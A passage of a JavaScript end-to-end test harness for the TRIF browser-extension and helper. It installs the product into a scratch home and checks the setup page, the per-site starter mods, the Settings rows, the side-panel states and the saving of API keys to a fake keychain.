'use strict';
// One e2e scenario: install TRIF into a scratch home (fresh, or upgrading from an older release), start a
// throwaway browser connected to that home's helper, and check the whole chain. See docs/TESTING.md.

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { sleep, waitFor, run, runAsync, pidsMatching, killMatching } = require('./lib/util');
const I = require('./lib/install');
const { FirefoxDriver } = require('./lib/firefox');
const { ChromeDriver } = require('./lib/chrome');
// The sites setup turns TRIF on for (helper/lib/preinstalled.js SITES_ON).
const SITES_START = ['amazon.com', 'google.com', 'instagram.com', 'x.com'];
const { SWEEP_EXPECT } = require('./lib/server');
const { makeFakeKeychain } = require('../fake-keychain');

const REAL_HOME = os.userInfo().homedir;
const SHIPPED_IDS = require('../../helper/lib/preinstalled').PREINSTALLED.map((p) => p.id || p);
const { RETIRED, siteOf, starterSites, SITES_ON } = require('../../helper/lib/preinstalled');
// Tim's mods for a site (a scope: x.com, google.com).
const shippedFor = (site) => SHIPPED_IDS.filter((id) => siteOf(id) === site);
// The fresh scenario picks these on the setup page, adds this one from Settings and this one with the link on
// its own panel; an upgrade (every site it had counts as added) has the link on the site that's new since.
const FRESH_PICKS = ['x.com', 'google.com'];
const DELETED = 'x.com/rainbow-rave'; // switched on, deleted in the panel, then back from Settings' "Add the rest": fresh, and off as listed
const SETTINGS_ADD = 'amazon.com';
const LINK_SITE = { fresh: { site: 'instagram.com', host: 'www.instagram.com', name: 'Instagram' }, upgrade: { site: 'timsrobot.com', host: 'timsrobot.com', name: 'timsrobot.com' } };

// Files of the real setup the suite must never change: checked before and after (read only).
const REAL_FILES = [
  path.join(REAL_HOME, 'Library/Application Support/Mozilla/NativeMessagingHosts/com.webmods.helper.json'),
  path.join(REAL_HOME, 'Library/Application Support/Google/Chrome/NativeMessagingHosts/com.webmods.helper.json'),
  path.join(REAL_HOME, '.trif/config.json'),
  path.join(REAL_HOME, '.webmods/config.json'),
  path.join(REAL_HOME, 'Library/Application Support/TRIF/config.json'), // the real private folder (0.2.0)
  // (Not the real helper.log: the user's own helper writes it whenever their TRIF is in use, run or not.)
];
function fingerprint(files) {
  return files.map((f) => {
    try { const st = fs.lstatSync(f); return `${f} ${st.mtimeMs} ${crypto.createHash('sha1').update(fs.readFileSync(f)).digest('hex')}`; } catch { return `${f} -`; }
  }).join('\n');
}

const BANNER_MOD = `// ==WebMod==
// @name        E2E Banner
// @description Written by the e2e harness: marks the page and changes #target
// @match       *://127.0.0.1/*
// @run-at      document-start
// ==/WebMod==
document.documentElement.dataset.trifE2e = 'ran';
const apply = () => { const t = document.getElementById('target'); if (t) t.textContent = 'Changed by the E2E Banner mod.'; };
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', apply); else apply();
`;
const OFF_SITE_MOD = `// ==WebMod==
// @name        E2E Off Site
// @description Written by the e2e harness for localhost, where TRIF stays off: must never run
// ==/WebMod==
document.documentElement.dataset.trifE2eOff = 'ran';
`;
const USER_MOD = `// ==WebMod==
// @name        E2E User Mod
// @description A mod the user wrote before upgrading (e2e harness)
// @match       *://127.0.0.1/*
// ==/WebMod==
document.documentElement.dataset.trifE2eUser = 'ran';
`;

// The gate's top bar: the status dot, the robot (asleep) and settings.
const GATE_BAR = ['#dot', '#bar-robot', '#settings-btn'];

// "Agent on this site" for the test sites (the harness drives them with trif run): Run code.
const AGENT_SITES = { '127.0.0.1': 'run', 'x.com': 'run', 'google.com': 'run', 'example.com': 'run' };

class Scenario {
  /**
   * opts: { browser: 'firefox'|'chrome', kind: 'fresh'|'upgrade', work, newTgz, oldTgz, results, servers,
   *         agent, codex, headless, extensionDirFirefox }
   */
  constructor(opts) {
    this.o = opts;
    this.r = opts.results;
    this.work = opts.work;
    this.home = path.join(this.work, 'h'); // the scratch HOME
    this.trif = path.join(this.home, '.trif');
    // TRIF's private folder (settings, logs, run logs, screenshots), where setup puts it for the scratch
    // home's ~/.trif. The helper for agent runs gets the real HOME, so it's told this one (TRIF_PRIVATE).
    this.priv = path.join(this.home, 'Library', 'Application Support', 'TRIF');
    this.label = `${opts.browser}-${opts.kind}${opts.oldTgz ? `-${path.basename(opts.oldTgz).replace(/\.tgz$/, '').replace(/^\D+-/, '')}` : ''}`;
    this.shots = 0;
  }

  // ---- helpers

  // (Without --oss, the fake keychain from the unit tests, in the work folder: the real Keychain is never
  // asked about API keys, and the panel's key row can be tried for real.)
  keychain() {
    if (!this._keychain) this._keychain = makeFakeKeychain(path.join(this.work, 'keychain'));
    return this._keychain;
  }

  env(extra) { return I.scratchEnv(this.home, { ...(this.o.oss ? {} : { TRIF_KEYCHAIN_BIN: this.keychain().bin }), TRIF_REVEAL_CMD: this.revealStub().bin, ...extra }); }

  /** A stand-in for open/xdg-open (helper/lib/reveal.js TRIF_REVEAL_CMD): appends its arguments to a log. */
  revealStub() {
    if (!this._reveal) {
      const dir = path.join(this.work, 'reveal');
      fs.mkdirSync(dir, { recursive: true });
      const log = path.join(dir, 'revealed.log');
      const bin = path.join(dir, 'fake-open.sh');
      fs.writeFileSync(bin, `#!/bin/sh\nprintf '%s\\n' "$*" >> '${log}'\n`, { mode: 0o755 });
      this._reveal = { bin, log };
    }
    return this._reveal;
  }

  /** Runs the installed `trif` (the scratch home's wrapper). */
  async cli(args, { json = false, timeoutMs = 60000, env = undefined } = {}) {
    const r = await runAsync(path.join(this.trif, 'bin', 'trif'), [...args, ...(json ? ['--json'] : [])], { env: this.env(env), cwd: this.home, timeoutMs });
    if (json) {
      try { return { ...r, json: JSON.parse(r.stdout) }; } catch { return { ...r, json: null }; }
    }
    return r;
  }

  /** A real click in the panel; an approval dialog that's open (sidepanel.js) is put off first (Not now), as
   *  the user would, unless the click is in it. */
  async panelClick(sel) {
    if (!/^#approval\b/.test(sel)) await this.dismissApproval();
    return this.d.click(this.panelCtx, sel);
  }

  /** Not now on every card of the approval dialog, if it's open (they stay on hold, the badge says so). */
  async dismissApproval() {
    return this.panel(`async () => { const d = document.getElementById('approval'); let n = 0; while (d && d.open && n++ < 50) d.querySelector('.ap-x').click(); return n; }`).catch(() => 0);
  }

  /** What the approval dialog shows, or null when it's closed. */
  async approvalState() {
    return this.panel(`async () => {
      const d = document.getElementById('approval');
      if (!d || !d.open) return null;
      const q = (s) => d.querySelector(s);
      return { mod: d.dataset.mod, count: q('.ap-count').textContent, name: q('.ap-name').textContent, chip: q('.ap-chip').textContent, where: q('.ap-where').textContent,
        lead: q('.ap-lead').textContent, items: [...d.querySelectorAll('.ap-facts li')].map((x) => x.lastChild.textContent),
        together: q('.ap-together').hidden ? [] : [...d.querySelectorAll('.ap-together p')].map((x) => x.textContent),
        note: q('.ap-note').textContent, claim: q('.ap-claim').hidden ? '' : q('.ap-claim').textContent, show: q('.ap-show').textContent,
        focusIn: d.contains(document.activeElement), badge: !document.getElementById('waiting-badge').hidden };
    }`);
  }

  /** The approval dialog for one mod: put off whatever's open, then its row's "on hold" tag (a real click). */
  async approvalFor(id) {
    await waitFor(`${id} on hold in the panel`, () => this.panel(`async () => !!document.querySelector('li[data-mod="${id}"] .tag.on-hold') || null`), { timeoutMs: 15000 });
    await this.dismissApproval();
    await this.d.click(this.panelCtx, `li[data-mod="${id}"] .tag.on-hold`);
    return waitFor(`the approval dialog for ${id}`, async () => { const a = await this.approvalState(); return a && a.mod === id ? a : null; }, { timeoutMs: 10000 });
  }

  async shot(ctx, name) {
    const file = this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-${name}.png`);
    try { await this.d.screenshot(ctx, file); } catch (e) { this.r.note(`screenshot ${name} failed: ${e.message}`); }
    return file;
  }

  /** The setup page's checklist: each step done / now / later / hidden, and what the open one says. */
  async setupState() {
    return this.ext(`async () => {
      const q = (s) => document.querySelector(s);
      const step = (id) => { const e = q('#step-' + id); return e.hidden ? 'hidden' : ['done', 'now', 'later'].find((c) => e.classList.contains(c)) || '?'; };
      return { docTitle: document.title, title: q('#title').textContent, sub: q('#sub').textContent,
        steps: ['helper', 'browser', 'scripts', 'starter', 'sites', 'login', 'try'].map(step),
        links: [...document.querySelectorAll('.step.now .body a')].map((a) => a.textContent + ' ' + a.href),
        states: [...document.querySelectorAll('.step.done .state')].map((e) => e.textContent),
        now: q('.step.now')?.innerText.trim() || '',
        buttons: [...document.querySelectorAll('.step.now .body button')].map((b) => b.textContent) };
    }`);
  }

  async waitSetup(what, pred, timeoutMs = 20000) {
    let last = null;
    try {
      return await waitFor(`the setup page: ${what}`, async () => { last = await this.setupState(); return pred(last) ? last : null; }, { timeoutMs });
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  /**
   * The setup page all ticked: the agent can run (here: an API key for Claude Code in the scratch keychain,
   * which counts as logged in; taken out again after). Then "TRIF is ready" and Try it, with the sites
   * where a mod TRIF comes with is on.
   */
  async setupDoneCheck() {
    const st = await this.setupState();
    let keyed = false;
    if (st.steps[5] !== 'done') {
      const set = run(path.join(this.trif, 'bin', 'trif'), ['agent', 'key', '--agent', 'claude', '--set-key'], { env: this.env(), cwd: this.home, input: 'sk-ant-e2e-not-a-real-key-0000\n' });
      if (set.status !== 0) throw new Error(`trif agent key --set-key: ${set.stderr || set.stdout}`);
      keyed = true;
    }
    try {
      // (The helper keeps an agent's login state for 30 s; the page asks every 5.)
      const x = await this.waitSetup('all ticked', (s) => s.steps.join() === 'done,done,done,done,done,done,now' && s.title === 'TRIF is ready', 60000);
      // Try it: a button for each site where a shipped mod is on and TRIF is on for the site (x.com's Detox Timeline).
      if (x.sub !== 'Open any website, click the TRIF icon, and ask for a change.' || !x.buttons.includes('Open x.com')
        || !x.buttons.every((b) => /^Open [\w-]+(\.[\w-]+)+$/.test(b))) throw new Error(JSON.stringify(x));
      await this.shot(this.control, 'setup-page-done');
      return `"${x.title}"; ${x.buttons.join(', ')}`;
    } finally {
      if (keyed) run(path.join(this.trif, 'bin', 'trif'), ['agent', 'key', '--agent', 'claude', '--remove-key'], { env: this.env(), cwd: this.home });
    }
  }

  /** Runs `fn` in the extension's own setup page, which has the chrome.* APIs. */
  ext(fn, args = []) { return this.d.eval(this.control, fn, args); }

  page(fn, args = []) { return this.d.eval(this.pageCtx, fn, args); }
  panel(fn, args = []) { return this.d.eval(this.panelCtx, fn, args); }

  async pageState() {
    return this.page(`async () => ({
      url: location.href,
      ready: document.readyState,
      banner: document.documentElement.dataset.trifE2e || null,
      off: document.documentElement.dataset.trifE2eOff || null,
      user: document.documentElement.dataset.trifE2eUser || null,
      target: document.getElementById('target')?.textContent || null,
      text: document.documentElement.innerText.slice(0, 2000), // all of it: a mod may add to <html> itself
    })`);
  }

  async panelState() {
    return this.panel(`async () => {
      const q = (s) => document.querySelector(s);
      return {
        site: q('#site')?.textContent || '',
        gate: !q('#gate').hidden,
        gateTitle: q('#gate-title')?.textContent || '',
        gateText: q('#gate-btn')?.textContent || '',
        links: q('#gate-links')?.hidden === false
          ? [...document.querySelectorAll('#gate-links a:not([hidden])')].map((a) => a.textContent + ' (' + a.title + ')') : [],
        grey: document.body.classList.contains('site-disconnected'),
        red: document.body.classList.contains('site-blocked'),
        dialog: q('#mode-dialog')?.open ? q('#mode-dialog').innerText.trim() : '',
        gateWhy: q('#gate-why')?.hidden === false ? q('#gate-why').textContent : '',
        gateErr: q('#gate-err')?.hidden === false ? q('#gate-err').textContent : '',
        siteOn: q('#site-switch')?.getAttribute('aria-checked') === 'true',
        notice: q('#notice').hidden ? '' : q('#notice').innerText,
        dot: q('#dot')?.className || '',
        mods: [...document.querySelectorAll('#mod-list > li[data-mod]')].map((li) => ({
          id: li.dataset.mod,
          on: li.querySelector('button.switch')?.getAttribute('aria-checked') === 'true',
          running: !!li.querySelector('.light.on'),
          update: li.querySelector('.mod-update')?.innerText || null,
          source: li.querySelector('.mod-source')?.textContent || null,
        })),
      };
    }`);
  }

  /** Waits until the test page has (re)loaded and `pred(state)` holds. */
  async waitPage(what, pred, timeoutMs = 20000) {
    return waitFor(what, async () => {
      // The tab may be mid-navigation: find it again by URL each time.
      this.pageCtx = await this.d.findPage((u) => u.startsWith(this.pageUrlPrefix), { timeoutMs: 5000 });
      const s = await this.pageState();
      return s.ready !== 'loading' && pred(s) ? s : null;
    }, { timeoutMs });
  }

  async waitPanel(what, pred, timeoutMs = 20000) {
    return waitFor(what, async () => { const s = await this.panelState(); return pred(s) ? s : null; }, { timeoutMs });
  }

  /** The panel's top bar: what shows in it, and how the robot in the middle looks and is labelled. */
  async barState() {
    return this.panel(`async () => {
      const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
      const robot = document.querySelector('#bar-robot');
      const look = robot ? getComputedStyle(robot.querySelector('svg')) : null;
      return {
        bar: shown('.bar'),
        shown: ['#dot', '#site', '#bar-robot', '#site-switch', '#new-chat', '#settings-btn'].filter(shown),
        robotButton: robot?.tagName === 'BUTTON' && robot.tabIndex >= 0,
        robotLabel: robot?.getAttribute('aria-label') || '',
        switchLabel: document.querySelector('#site-switch')?.getAttribute('aria-label') || '',
        filter: look?.filter || '', opacity: look ? Number(look.opacity) : null, hovered: !!robot?.matches(':hover'),
      };
    }`);
  }

  /** Waits until the top bar shows exactly `want` (selectors, in bar order) and `pred(bar)` holds. */
  async waitBar(what, want, pred = () => true) {
    let last = null;
    try {
      return await waitFor(what, async () => {
        last = await this.barState();
        return last.bar && last.shown.join(' ') === want.join(' ') && pred(last) ? last : null;
      }, { timeoutMs: 10000 });
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  // The robot asleep in the bar: grey and dim (the eyes still there); with the mouse on him, a little
  // brighter, still asleep; awake: in colour.
  static grey(b) { return Number((/grayscale\(([\d.]+)\)/.exec(b.filter) || [])[1] || 0); }
  static dim(b) { return !b.hovered && Scenario.grey(b) === 1 && b.opacity <= 0.6; } // 0.45 dark, 0.6 light
  static stirring(b) { return b.hovered && Scenario.grey(b) > 0 && Scenario.grey(b) < 1 && b.opacity > 0.5 && b.opacity < 1; }
  static awake(b) { return b.filter === 'none' && b.opacity === 1; }

  /** Settings open from the bar (wherever it is: the gate, the landing page), work, and close again. */
  async settingsOpen(name) {
    await this.panelClick('#settings-btn');
    let last = null;
    const s = await waitFor('settings to open, with the agents and instructions from the helper', async () => {
      last = await this.panel(`async () => {
        const e = document.querySelector('#settings');
        return { open: !!e && e.getClientRects().length > 0, expanded: document.querySelector('#settings-btn').getAttribute('aria-expanded'),
          agents: document.querySelectorAll('#agent option').length, instructions: !document.querySelector('#instructions').disabled,
          update: document.querySelector('#update-note').textContent };
      }`);
      return last.open && last.expanded === 'true' && last.agents > 1 && last.instructions ? last : null;
    }, { timeoutMs: 10000 }).catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    await sleep(300);
    await this.shot(this.panelCtx, name);
    await this.panelClick('#settings-btn');
    await waitFor('settings to close', async () => this.panel(`async () => document.querySelector('#settings').hidden`), { timeoutMs: 5000 });
    return `${s.agents - 1} agents listed, instructions loaded; "${s.update}"`;
  }

  /**
   * Settings → Open model → OpenRouter: a key saved (in the fake keychain) shows as "✓ Saved" with Replace
   * and Remove instead of the field; Replace brings the field back with Cancel; Remove empties the
   * keychain. The agent and provider are put back afterwards.
   */
  async openModelKey() {
    const kc = this.keychain();
    const KEY = 'sk-or-v1-e2e-not-a-real-key-0000';
    await this.panelClick('#settings-btn');
    await waitFor('settings to open', async () => this.panel(`async () => !document.querySelector('#settings').hidden && document.querySelectorAll('#agent option').length > 1`), { timeoutMs: 10000 });
    const before = await this.panel(`async () => ({ agent: document.querySelector('#agent').value, oss: !!document.querySelector('#agent option[value="codex-oss"]') })`);
    if (!before.oss) { await this.panelClick('#settings-btn'); return 'skipped: no open model agent listed (Codex not installed?)'; }
    const pick = (sel, value) => this.panel(`async (sel, value) => { const e = document.querySelector(sel); e.value = value; e.dispatchEvent(new Event('change', { bubbles: true })); return e.value; }`, [sel, value]);
    const row = () => this.panel(`async () => {
      const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
      return { row: shown('#om-key-row'), saved: shown('#om-key-saved'), edit: shown('#om-key-edit'), cancel: shown('#om-key-cancel'),
        field: document.querySelector('#om-key').value, focused: document.activeElement?.id || '', status: document.querySelector('#om-key-status').textContent,
        provider: document.querySelector('#om-provider').value };
    }`);
    let last = null;
    const until = (what, ok) => waitFor(what, async () => { last = await row(); return ok(last) ? last : null; }, { timeoutMs: 10000 })
      .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    await pick('#agent', 'codex-oss');
    await until('the open model settings', (x) => !!x.provider);
    const provider = last.provider;
    await pick('#om-provider', 'openrouter');
    await until('the key field (no key yet)', (x) => x.provider === 'openrouter' && x.row && x.edit && !x.saved && !x.cancel);
    await this.panel(`async (k) => { const e = document.querySelector('#om-key'); e.value = k; e.dispatchEvent(new Event('input', { bubbles: true })); }`, [KEY]);
    await this.panelClick('#om-key-save');
    const saved = await until('"✓ Saved" with Replace and Remove', (x) => x.saved && !x.edit && x.field === '');
    if (!Object.values(kc.items()).includes(KEY)) throw new Error(`the key isn't in the keychain: ${JSON.stringify(Object.keys(kc.items()))}`);
    await this.panelClick('#om-key-replace');
    await until('the field again, with Cancel, focused', (x) => x.edit && x.cancel && !x.saved && x.focused === 'om-key');
    await this.shot(this.panelCtx, 'panel-open-model-key-replace');
    await this.panelClick('#om-key-cancel');
    await until('back to "✓ Saved"', (x) => x.saved && !x.edit);
    await this.shot(this.panelCtx, 'panel-open-model-key-saved');
    await this.panelClick('#om-key-remove');
    await until('the field (key removed)', (x) => x.edit && !x.saved && !x.cancel);
    if (Object.values(kc.items()).includes(KEY)) throw new Error('Remove left the key in the keychain');
    await pick('#om-provider', provider);
    await pick('#agent', before.agent);
    await this.panelClick('#settings-btn');
    return `saved ("${saved.status.slice(0, 60)}…"), replace and cancel, removed; agent and provider (${provider}) put back`;
  }

  // ---- Tim's mods, site by site (helper/lib/preinstalled.js)

  /** The sites preinstalled.json says were added. */
  addedSites() {
    const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
    const offered = new Set((pre.offered || []).map(siteOf));
    return starterSites().filter((s) => (pre.starter || {})[s] === 'added' || offered.has(s));
  }

  /** What the setup page's "Tim's mods" step shows: a row per site, its box, its words. */
  async starterStepState() {
    return this.ext(`async () => {
      const step = document.querySelector('#step-starter');
      return { state: step.querySelector('.state').textContent, now: step.classList.contains('now'), done: step.classList.contains('done'),
        text: step.querySelector('.body').innerText,
        rows: [...step.querySelectorAll('li.pick')].map((li) => ({ site: li.dataset.site, ticked: li.querySelector('input').checked, boxes: li.querySelectorAll('input').length,
          name: li.querySelector('.pick-name')?.firstChild?.textContent || '', mods: li.querySelector('.pick-mods')?.textContent || '' })),
        source: step.querySelector('#starter-source')?.href || '',
        buttons: [...step.querySelectorAll('.body button')].map((b) => [b.id, b.textContent, b.disabled]) };
    }`);
  }

  /**
   * The setup page, after user scripts: "Tim's mods". Fresh: nothing of Tim's on disk; a row per site,
   * X, Google, Amazon and Instagram ticked, timsrobot.com not; the user leaves only X and Google ticked
   * and adds them: their mods are there and TRIF is on for them, nothing for the rest. An upgrade: already
   * ticked, every site it had added.
   */
  async starterSetupCheck() {
    const r = this.r;
    await r.check('setup page: Tim\'s mods, site by site (X and Google picked; nothing else on disk or on)', async () => {
      if (this.o.kind === 'upgrade') {
        const x = await this.waitSetup('Tim\'s mods ticked', (st) => st.steps[3] === 'done');
        const st = await this.starterStepState();
        const added = this.addedSites();
        if (added.join() !== SITES_ON.join()) throw new Error(`added: ${added.join(', ')}`);
        if (st.state !== 'Google, X, Amazon and Instagram') throw new Error(`the step says: ${st.state}`);
        return `ticked already: ${st.state} (${x.steps.join(',')})`;
      }
      await this.waitSetup('Tim\'s mods open', (st) => st.steps[3] === 'now');
      let st = await waitFor('the checklist', async () => { const v = await this.starterStepState(); return v.rows.length ? v : null; }, { timeoutMs: 10000 });
      const sites = starterSites();
      if (st.rows.map((x) => x.site).join() !== sites.join()) throw new Error(`rows: ${st.rows.map((x) => x.site).join(', ')}`);
      const ticked = st.rows.filter((x) => x.ticked).map((x) => x.site);
      if (ticked.join() !== SITES_ON.join()) throw new Error(`ticked to start: ${ticked.join(', ')}`);
      // One box per site, its mods' names as plain text.
      for (const row of st.rows) {
        if (row.boxes !== 1 || row.mods.split(', ').length !== shippedFor(row.site).length || /\(/.test(row.mods)) throw new Error(`${row.site}'s row: ${JSON.stringify(row)}`);
      }
      for (const want of [/None of them is on your computer until you choose/, /plain JavaScript you can read first/,
        /Each mod has its own switch in the TRIF (side panel|sidebar): you can turn any of them off individually, any time\. You can add the others later, in the panel’s Settings\./]) {
        if (!want.test(st.text)) throw new Error(`the step doesn't say ${want}: ${st.text}`);
      }
      if (!/github\.com\/acapellascience\/trif\/.*examples\/sites/.test(st.source)) throw new Error(`see the code: ${st.source}`);
      if (st.buttons.map((b) => b[1]).join() !== 'Add these,Start with none') throw new Error(`buttons: ${JSON.stringify(st.buttons)}`);
      const x = st.rows.find((row) => row.site === 'x.com');
      if (x.name !== 'X' || !/^Detox Timeline, Follow Status, Profile Styler, Post Styler, Style Encoder, X-Flyer, Rainbow Rave$/.test(x.mods)) throw new Error(`X's row: ${JSON.stringify(x)}`);
      if (fs.existsSync(path.join(this.trif, 'sites', 'x.com')) || fs.existsSync(path.join(this.trif, 'sites', 'www.google.com'))) throw new Error('Tim\'s mods on disk before the choice');
      await this.ext(`async () => document.querySelector('#starter-add').scrollIntoView({ block: 'end' })`);
      await sleep(200);
      await this.shot(this.control, 'starter-setup-before');
      for (const row of st.rows) {
        if (row.ticked !== FRESH_PICKS.includes(row.site)) await this.d.click(this.control, `#step-starter li[data-site="${row.site}"] input`);
      }
      st = await this.starterStepState();
      const now = st.rows.filter((row) => row.ticked).map((row) => row.site);
      if (now.sort().join() !== [...FRESH_PICKS].sort().join()) throw new Error(`ticked: ${now.join(', ')}`);
      await this.d.click(this.control, '#starter-add');
      const done = await this.waitSetup('Tim\'s mods ticked', (v) => v.steps[3] === 'done');
      st = await this.starterStepState();
      if (st.state !== 'Google and X') throw new Error(`the ticked step says: ${st.state}`);
      await this.shot(this.control, 'starter-setup-after');
      // On disk: theirs, and the choice per site; TRIF on for them only.
      const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
      const choice = Object.fromEntries(sites.map((s) => [s, FRESH_PICKS.includes(s) ? 'added' : 'none']));
      if (JSON.stringify(pre.starter) !== JSON.stringify({ ...pre.starter, ...choice }) || Object.keys(pre.starter).length !== sites.length) throw new Error(`preinstalled.json starter: ${JSON.stringify(pre.starter)}`);
      if (pre.skipped) throw new Error(`setup left mods out: ${JSON.stringify(pre.skipped)}`);
      const missing = FRESH_PICKS.flatMap(shippedFor).filter((id) => !fs.existsSync(path.join(this.trif, 'sites', `${id}.js`)));
      if (missing.length) throw new Error(`not on disk: ${missing.join(', ')}`);
      const folders = fs.readdirSync(path.join(this.trif, 'sites')).filter((f) => !['127.0.0.1', 'localhost'].includes(f)).sort();
      if (folders.join() !== 'www.google.com,x.com') throw new Error(`sites/: ${folders.join(', ')}`);
      const status = await waitFor('TRIF on for X and Google', async () => {
        const e = (await this.cli(['status'], { json: true })).json?.extension;
        return e && FRESH_PICKS.every((s) => e.sitesOn.includes(s)) ? e : null;
      }, { timeoutMs: 15000 });
      const stray = status.sitesOn.filter((s) => sites.includes(s) && !FRESH_PICKS.includes(s));
      if (stray.length) throw new Error(`TRIF on for ${stray.join(', ')} too`);
      return `"${st.state}" (${done.steps.join(',')}); sites/: ${folders.join(', ')}; on for ${status.sitesOn.join(', ')}`;
    });
  }

  /** The panel's Settings, "Tim's mods": each site added or with Add. Fresh: Add for Amazon adds its mods and turns TRIF on there. */
  async starterSettingsCheck() {
    const r = this.r;
    await r.check(`Settings: Tim's mods by site${this.o.kind === 'fresh' ? `, and Add for ${SETTINGS_ADD}` : ''}`, async () => {
      const rows = () => this.panel(`async () => {
        const e = document.querySelector('#starter');
        return { shown: !!e && e.getClientRects().length > 0, text: e?.innerText || '',
          rows: [...document.querySelectorAll('#starter-list li')].map((li) => ({ site: li.dataset.site, added: !!li.querySelector('.starter-state'), button: li.querySelector('button')?.textContent || null, text: li.innerText, mods: li.querySelector('.starter-mods')?.textContent || '' })) };
      }`);
      const status = async () => (await this.cli(['status'], { json: true })).json?.extension;
      const deleted = path.join(this.trif, 'sites', `${DELETED}.js`);
      if (this.o.kind === 'fresh') {
        // One of Tim's mods, switched on, then deleted in the panel (its trash icon): it stays gone.
        await this.cli(['enable', DELETED]);
        await waitFor(`${DELETED} on`, async () => (await status())?.mods.find((m) => m.id === DELETED)?.enabled === true, { timeoutMs: 10000 });
        await this.panelClick(`#mod-list > li[data-mod="${DELETED}"] .mod-delete`);
        await waitFor(`${DELETED} deleted`, async () => !fs.existsSync(deleted) && !(await status())?.mods.some((m) => m.id === DELETED), { timeoutMs: 10000 });
      }
      await this.panelClick('#settings-btn');
      let last = null;
      const until = (what, ok) => waitFor(what, async () => { last = await rows(); return ok(last) ? last : null; }, { timeoutMs: 15000 })
        .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
      try {
        let st = await until('Tim\'s mods in Settings', (x) => x.shown && x.rows.length === starterSites().length && (this.o.kind !== 'fresh' || x.rows.find((y) => y.site === 'x.com')?.button));
        const added = this.addedSites();
        const pre = I.readJson(path.join(this.trif, 'preinstalled.json')) || {};
        const left = [...(pre.skipped || []), ...(pre.offered || []).filter((id) => added.includes(siteOf(id)) && SHIPPED_IDS.includes(id) && !fs.existsSync(path.join(this.trif, 'sites', `${id}.js`)))];
        // Added: "Added"; added with a mod not on disk (deleted, or left out): "Add the rest", saying which; not added: "Add".
        const partly = (site) => left.some((id) => siteOf(id) === site);
        const expect = (site) => (!added.includes(site) ? 'Add' : partly(site) ? 'Add the rest' : null);
        const wrong = st.rows.filter((x) => x.added !== (expect(x.site) === null) || (expect(x.site) && x.button !== expect(x.site)));
        if (this.o.kind === 'fresh') {
          const xr = st.rows.find((x) => x.site === 'x.com');
          if (!/^Added: Detox Timeline, Follow Status, Profile Styler, Post Styler, Style Encoder, X-Flyer\. Not added: Rainbow Rave\.$/.test(xr.mods) || /Rainbow Rave.*Not added/.test(xr.mods)) throw new Error(`X in Settings: ${JSON.stringify(xr)}`);
        }
        if (wrong.length) throw new Error(`rows: ${JSON.stringify(st.rows)} (added: ${added.join(', ')})`);
        if (!/^Tim’s mods/.test(st.text) || !/see the code/.test(st.text)) throw new Error(`the section says: ${st.text}`);
        await this.panel(`async () => document.querySelector('#starter').scrollIntoView({ block: 'center' })`);
        await sleep(300);
        await this.shot(this.panelCtx, 'starter-settings');
        if (this.o.kind !== 'fresh') return st.rows.map((x) => `${x.site} ${x.button || 'added'}`).join(', ');
        // "Add the rest": the deleted one comes back, a fresh copy, off as Tim set it (it was on when deleted).
        const offeredText = st.rows.find((y) => y.site === 'x.com').mods;
        await this.panelClick('#starter-list li[data-site="x.com"] button');
        st = await until('X all added again', (x) => x.rows.find((y) => y.site === 'x.com')?.added);
        if (!fs.existsSync(deleted) || fs.readFileSync(deleted, 'utf8') !== fs.readFileSync(path.join(this.trif, 'app', 'examples', 'sites', `${DELETED}.js`), 'utf8')) throw new Error(`${DELETED} isn't back as shipped`);
        const back = await waitFor(`${DELETED} back, off`, async () => { const m = (await status())?.mods.find((y) => y.id === DELETED); return m && m.enabled === false ? m : null; }, { timeoutMs: 10000 })
          .catch(async (e) => { throw new Error(`${e.message}: ${JSON.stringify((await status())?.mods.find((y) => y.id === DELETED))}`); });
        await sleep(300);
        await this.shot(this.panelCtx, 'starter-settings-restored');
        const restored = `${DELETED} deleted, offered ("${offeredText}"), back with "Add the rest" (${back.enabled ? 'on' : 'off'})`;
        await this.panelClick(`#starter-list li[data-site="${SETTINGS_ADD}"] button`);
        st = await until(`${SETTINGS_ADD} added`, (x) => x.rows.find((y) => y.site === SETTINGS_ADD)?.added);
        const want = shippedFor(SETTINGS_ADD);
        const missing = want.filter((id) => !fs.existsSync(path.join(this.trif, 'sites', `${id}.js`)));
        if (missing.length) throw new Error(`not on disk: ${missing.join(', ')}`);
        const e = await waitFor(`TRIF on for ${SETTINGS_ADD}`, async () => {
          const x = (await this.cli(['status'], { json: true })).json?.extension;
          return x && x.sitesOn.includes(SETTINGS_ADD) && want.every((id) => x.mods.some((m) => m.id === id)) ? x : null;
        }, { timeoutMs: 15000 });
        await sleep(300);
        await this.shot(this.panelCtx, 'starter-settings-added');
        return `${restored}; ${st.rows.map((x) => `${x.site} ${x.button || 'added'}`).join(', ')}; ${want.length} mods for ${SETTINGS_ADD}, TRIF on for ${e.sitesOn.join(', ')}`;
      } finally {
        await this.panelClick('#settings-btn').catch(() => {});
        await waitFor('settings to close', async () => this.panel(`async () => document.querySelector('#settings').hidden`), { timeoutMs: 5000 }).catch(() => {});
      }
    });
  }

  /**
   * A site Tim has mods for that the user hasn't added: its panel has "Add Tim's mods for <site>" (in the
   * gate, TRIF being off there). The link adds them; for a site in SITES_ON TRIF comes on there too.
   */
  async starterLinkCheck(win) {
    const r = this.r;
    const L = LINK_SITE[this.o.kind];
    await r.check(`a site's panel: "Add Tim's mods for ${L.name}" adds them`, async () => {
      const url = `https://${L.host}:${this.o.servers.tlsPort}/`;
      const tab = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [url, win.windowId]);
      const link = () => this.panel(`async () => {
        const p = document.querySelector('#site-starter');
        return { site: document.querySelector('#site').textContent, gate: !document.querySelector('#gate').hidden, shown: !!p && p.getClientRects().length > 0,
          inGate: !!p?.closest('#gate'), text: document.querySelector('#site-starter-link').textContent, err: document.querySelector('#site-starter-err').textContent,
